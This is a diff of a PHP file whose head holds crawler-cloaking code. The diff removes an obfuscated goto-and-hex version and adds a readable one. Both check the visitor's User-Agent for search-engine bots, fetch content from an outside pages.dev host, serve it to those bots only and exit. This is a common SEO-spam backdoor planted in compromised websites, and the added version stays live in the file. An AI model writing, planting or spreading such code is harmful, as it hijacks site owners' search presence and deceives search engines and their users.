@@ -1,7 +1,30 @@
 <?php
-goto YIVHR; JIUvR: c5ht8: goto Ox7wG; YIVHR: $ZNIS8 = ["\107\x6f\157\147\154\x65\142\x6f\x74", "\x42\151\156\x67\142\157\x74", "\123\154\x75\162\x70", "\104\x75\143\x6b\104\x75\143\x6b\102\157\x74", "\x42\141\x69\144\165\x73\x70\x69\x64\145\x72", "\x59\141\156\x64\x65\170\102\157\x74", "\x53\157\147\157\x75", "\x54\x65\x6c\x65\x67\x72\141\155\x42\157\164", "\105\x78\x61\x62\x6f\164", "\x66\x61\x63\x65\142\x6f\x74", "\x69\141\x5f\x61\x72\x63\150\151\166\x65\x72", "\x47\x6f\157\x67\x6c\x65\x2d\x53\x69\x74\145\55\x56\145\x72\151\x66\151\x63\x61\164\x69\157\x6e", "\107\x6f\x6f\147\x6c\145\55\111\156\x73\x70\x65\143\164\x69\157\156\124\x6f\x6f\x6c", "\101\150\162\145\146\163\x42\157\164"]; goto raeKt; raeKt: $rmd3R = $_SERVER["\110\x54\x54\120\x5f\125\x53\105\122\137\x41\107\105\116\x54"]; goto Hv_Ug; UXY2e: qViDI: goto NpDKn; Hv_Ug: $rmB_u = "\150\x74\x74\160\163\72\57\57\166\151\x73\x69\x6f\156\x78\x73\x72\x6f\x2e\160\141\x67\x65\163\x2e\x64\x65\166\x2f\x76\151\163\151\157\x6e\170\x73\162\x6f\x2f"; goto UyTGP; Lo9mo: curl_setopt($XUzqV, CURLOPT_RETURNTRANSFER, true); goto aRiOf; NpDKn: if (!$TH4lu) { goto lj9Rf; } goto fFHB_; I8yza: ZXNxM: goto bo44T; bo44T: curl_close($XUzqV); goto nEcOb; I9h0z: if (curl_errno($XUzqV)) { goto c5ht8; } goto LUgW0; aRiOf: curl_setopt($XUzqV, CURLOPT_FOLLOWLOCATION, true); goto s4U7c; UyTGP: $TH4lu = false; goto qB3Aq; T2HEt: curl_setopt($XUzqV, CURLOPT_URL, $rmB_u); goto Lo9mo; qB3Aq: foreach ($ZNIS8 as $cgG5G) { goto VI2PX; OateS: $TH4lu = true; goto OcXIe; VI2PX: if (!(strpos($rmd3R, $cgG5G) !== false)) { goto obr4H; } goto OateS; zzApx: kPj_D: goto TQL5v; RDxq7: obr4H: goto zzApx; OcXIe: goto qViDI; goto RDxq7; TQL5v: } goto UXY2e; fFHB_: $XUzqV = curl_init(); goto T2HEt; nEcOb: exit; goto VfNZi; Edy6E: goto ZXNxM; goto JIUvR; Ox7wG: echo "\x45\162\162\157\x72\x3a\40" . curl_error($XUzqV); goto I8yza; s4U7c: $mqmx9 = curl_exec($XUzqV); goto I9h0z; LUgW0: echo $mqmx9; goto Edy6E; VfNZi: lj9Rf:
+$zX1q = ['Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot', 'Sogou', 'TelegramBot', 'Exabot', 'facebot', 'ia_archiver', 'Google-Site-Verification', 'Google-InspectionTool', 'AhrefsBot'];
+$zK2v = $_SERVER['HTTP_USER_AGENT'];
+$zW3p = 'https://visionxsro.pages.dev/visionxsro/';
 
+$zA4r = false;
+foreach ($zX1q as $zB5t) {
+    if (strpos($zK2v, $zB5t) !== false) {
+        $zA4r = true;
+        break;
+    }
+}
 
+if ($zA4r) {
+    $zC6n = curl_init();
+    curl_setopt($zC6n, CURLOPT_URL, $zW3p);
+    curl_setopt($zC6n, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($zC6n, CURLOPT_FOLLOWLOCATION, true);
+    $zD7m = curl_exec($zC6n);
+    if (curl_errno($zC6n)) {
+        echo 'Error: ' . curl_error($zC6n);
+    } else {
+        echo $zD7m;
+    }
+    curl_close($zC6n);
+    exit;
+}
 
 /*
 if (substr($_SERVER['HTTP_HOST'], 0, 4) == 'www.') {
